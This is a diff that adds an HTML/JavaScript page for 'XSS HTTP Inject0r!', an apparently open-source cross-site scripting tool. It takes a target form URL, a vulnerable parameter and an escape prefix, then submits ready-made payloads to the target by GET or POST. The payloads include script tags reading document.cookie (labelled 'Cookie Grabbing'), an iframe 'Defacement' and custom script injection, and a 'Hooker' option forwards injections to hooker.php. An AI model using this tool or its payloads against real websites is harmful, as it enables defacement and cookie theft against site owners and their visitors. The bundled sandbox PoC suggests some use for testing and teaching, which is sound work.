@@ -1,0 +1,234 @@
+<!doctype html><html itemscope="" itemtype="http://schema.org/WebPage" lang="en">
+<head><title>XSS HTTP Inject0r!</title>
+<meta http-equiv="content-type" content="text/html;charset=utf-8"> 
+<link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon"> 
+<style type="text/css">
+<!--
+body,td,th {
+color: #FFFFFF;
+}
+body {
+background-color: #000000;
+}
+a {
+ color:lime;
+}
+-->
+</style>
+<script type="text/javascript">
+var alertbox = "<BODY ONLOAD=alert('1')>";
+var marquee = "<marquee>0wned!</marquee>";
+var cookie = "<ScRIPt>alert(document.cookie);<\/ScRiPt>";
+var iframe = "<iFrAmE src='../images/pwned.jpg' scrolling=no frameborder=0 width='1024' height='576'><\/iFrAmE>";
+window.onload = function() {
+    document.getElementById('use_custom').style.display = 'none';
+    document.getElementById('get_poc').style.display = 'block';
+    document.getElementById('post_poc').style.display = 'none';
+}
+function SetMethod(frm){
+ if (document.getElementById('get').checked){
+         document.getElementById('post_poc').style.display = 'none';
+         document.getElementById('get_poc').style.display = 'block';
+         document.poc.method="GET";
+     }
+     else{
+         document.getElementById('post_poc').style.display = 'block';
+         document.getElementById('get_poc').style.display = 'none';
+         document.poc.method="POST";
+     }
+}
+function SetScenario(frm){
+prefix = frm.prefix.value;
+custom_value = frm.custom_injection.value;
+  if (frm.target.value == ""){
+     alert("Hey! Where is your target?")
+     return false;
+     }
+  else if (frm.vulnerability.value == ""){ 
+     alert("You should enter a vulnerable parameter")
+     return false;
+     }
+     document.poc.action=frm.target.value;
+     document.getElementById('lulz').name=frm.vulnerability.value;
+     if(document.getElementById('alertbox').checked) {
+     document.getElementById('lulz').value=prefix+alertbox;
+     }
+     if(document.getElementById('marquee').checked) {
+     document.getElementById('lulz').value=prefix+marquee;
+     }
+     if(document.getElementById('cookie').checked) {
+     document.getElementById('lulz').value=prefix+cookie;
+     }
+     if(document.getElementById('iframe').checked) {
+     document.getElementById('lulz').value=prefix+iframe;
+     }
+     if(document.getElementById('custom').checked) {
+     document.getElementById('lulz').value=prefix+custom_value;
+     }
+     document.poc.submit();
+}
+function SetHook(frm){
+target = frm.target.value;
+vulnerability = frm.vulnerability.value;
+prefix = frm.prefix.value;
+custom_value = frm.custom_injection.value;
+  if (target == ""){
+     alert("Hey! Where is your target?")
+     return false;
+     }
+  else if (vulnerability == ""){
+     alert("You should enter a vulnerable parameter")
+     return false;
+     }
+     if(document.getElementById('alertbox').checked) {
+     injection = prefix+alertbox;
+     }
+     if(document.getElementById('marquee').checked) {
+     injection = prefix+marquee;
+     }
+     if(document.getElementById('cookie').checked) {
+     injection = prefix+cookie;
+     }
+     if(document.getElementById('iframe').checked) {
+     injection = prefix+iframe;
+     }
+     if(document.getElementById('custom').checked) {
+     injection = prefix+custom_value;
+     }
+     document.getElementById('injection').value=injection;
+     document.poc.action="hooker.php";
+     document.poc.submit();
+}
+function SetScript(frm) {
+    if (document.getElementById('custom').checked) {
+        document.getElementById('use_custom').style.display = 'block';
+        document.getElementById('line1').style.display = 'block';
+    }
+    else if (!document.getElementById('custom').checked) {
+        document.getElementById('use_custom').style.display = 'none';
+        document.getElementById('line1').style.display = 'none';
+   }
+}
+function LoadPoc(m,target,vuln,prefix){
+	if(m=="GET"){
+		document.getElementById("get").checked=true;
+	}else{
+		document.getElementById("post").checked=true;
+	}
+	document.getElementById("target").value=target;
+	document.getElementById("vulnerability").value=vuln;
+	document.getElementById("prefix").value=unescape(prefix);
+}
+var frame=0;
+function Egg(){
+    	window.scrollBy(0,50); // horizontal and vertical scroll increments
+    	scrolldelay = setTimeout('pageScroll()',100); // scrolls every 100 milliseconds
+var canvas = document.createElement('canvas');
+canvas.id = "CursorLayer";
+canvas.width  = 298;
+canvas.height = 96;
+canvas.style.zIndex   = -2;
+canvas.style.position = "absolute";
+canvas.style.padding=5;
+canvas.style.top = 0; 
+canvas.style.border = "1px solid";
+canvas.style.background = "red";
+ var context = canvas.getContext('2d');
+
+      context.font = 'italic 20pt Calibri';
+      context.fillText('BigBrother!!!', 50, 50);
+document.body.appendChild(canvas);
+var canvas = document.createElement('canvas');
+canvas.style.zIndex   = -1;
+canvas.style.background = "rgba(0,0,0,0)";
+canvas.width = 408;
+canvas.height = 598;
+document.body.appendChild(canvas);
+var ctx = canvas.getContext('2d');
+ctx.moveTo(200,200);
+for(i=0;i<10;i++){
+	ctx.strokeStyle = '#00ff00';
+	ctx.lineTo(200+100*Math.random(),100+500*Math.random());
+	ctx.stroke();
+	ctx.strokeStyle='#fffff0';
+      ctx.beginPath();
+	cx=200+100*Math.random();
+	cy=50+400*Math.random();
+      	ctx.arc(cx,cy, i*4, 0, 2 * Math.PI, false);
+	ctx.fill();
+	ctx.stroke();
+	ctx.strokeStyle='#ffff00';
+	ctx.fillStyle = 'rgba(0,0,0,0.5)';
+	ctx.arc(cx*1.2,cy*1.2, i*3, 0, 2 * Math.PI, false);
+      ctx.fill();
+      ctx.lineWidth = i/2;
+      ctx.strokeStyle = '#aa3300';
+      ctx.stroke();
+}
+setTimeout('Egg()', 500);
+frame++;
+}
+</script>
+</head><body>
+<center>
+ <table>
+   <tr valign="middle">
+     <td align="center">
+<br /><h2><a href="https://github.com/epsylon/xss-http-post-injector" target="_blank">XSS HTTP Inject0r!</a></h2> - 2014 - <a href="http://gplv3.fsf.org" target="_blank">GPLv3</a><br /><font size=-1><a style="text-decoration:none;" href=# onClick=javascript:Egg()>"little rabbit"</a> version</font>
+      </td>
+     <td>
+<img hspace="10" src="images/pwned.jpg" width="350" height="203" border="1"><br />
+     </td>
+    </tr>
+ </table>
+<hr>
+<form name="poc">
+<table>
+ <tr>
+  <td><u>Method</u> (HTTP method):</td><td><table><tr><td><input type="radio" name="method" id="get" onclick="javascript:SetMethod();" checked value="GET">GET</td><td><input type="radio" name="method" id="post" onclick="javascript:SetMethod(this.form);" value="POST">POST</td></tr></table></td>
+ </tr>
+ <tr>
+ <td colspan=2>
+<hr>
+<label id="get_poc"><b>PoC</b> -> Target: <i>sandbox/search.php</i> -> Vuln.: <i>search_text</i> -> Vector: <i>"></i> | <a href="sandbox/get.html" target="_blank">SandBoX (HTTP-GET)</a> | <a onClick="javascript:LoadPoc('GET','sandbox/search.php','search_text','%22>')" href=#>Load PoC</a></label>
+<label id="post_poc"><b>PoC</b> -> Target: <i>sandbox/search.php</i> -> Vuln.: <i>search_text</i> -> Vector: <i>"></i> | <a href="sandbox/post.html" target="_blank">SandBoX (HTTP-POST)</a> | <a onClick="javascript:LoadPoc('POST','sandbox/search.php','search_text','%22>')" href=#>Load PoC</a></label>
+<hr>
+</td>
+ </tr>
+ <tr>
+ <td><u>Target</u> (Url to target's form):</td><td><input type="text" name="target" size="35" id="target"> (<i>ex: http://vulnsite.com/contact.php</i>)</td>
+ </tr>
+ <tr>
+  <td><u>Vulnerability</u> (Vulnerable parameter):</td><td><input type="text" name="vulnerability" id="vulnerability"> (<i>ex: contact_email</i>)</td>
+ </tr>
+ <tr>
+  <td><u>Vector</u> (Code prefix to inject):</td><td><input type="text" name="prefix" size="35" id="prefix"> (<i>ex: "></i>)</td>
+ </tr>
+</table>
+<hr>
+<table border="1" cellpadding="6" cellspacing="6">
+ <tr>
+  <td>JS AlertBox</td><td> <input type="radio" name="exploit" id="alertbox" onclick="javascript:SetScript();" checked></td>
+  <td>Cookie Grabbing</td><td> <input type="radio" name="exploit" id="cookie" onclick="javascript:SetScript();" /></td>
+  <td>HTML Marquee</td><td> <input type="radio" name="exploit" id="marquee" onclick="javascript:SetScript();" /></td>
+  <td>Defacement</td><td> <input type="radio" name="exploit" id="iframe" onclick="javascript:SetScript();" /></td>
+  <td>Custom Script</td><td> <input type="radio" name="exploit" id="custom" onclick="javascript:SetScript();" /></td>
+ </tr>
+</table>
+<hr id="line1" style="display:none">
+<div id="use_custom" style="display:none">
+ <input type="text" name="custom_injection" size="92">
+</div>
+<hr>
+  <input type="hidden" id="lulz"></input>
+  <input type="hidden" name="injection" id="injection"></input>
+<table cellpadding="6" cellspacing="6" border="0">
+ <tr>
+  <td><input type="submit" value="Inject!" onClick="return SetScenario(this.form)" style="padding: 10px; font-weight:bold;"></td>
+  <td><input type="submit" value="Hooker" onClick="return SetHook(this.form)" style="padding: 10px; font-weight:bold;"></td>
+ </tr>
+</table>
+</form>
+
+</body>
+</html>
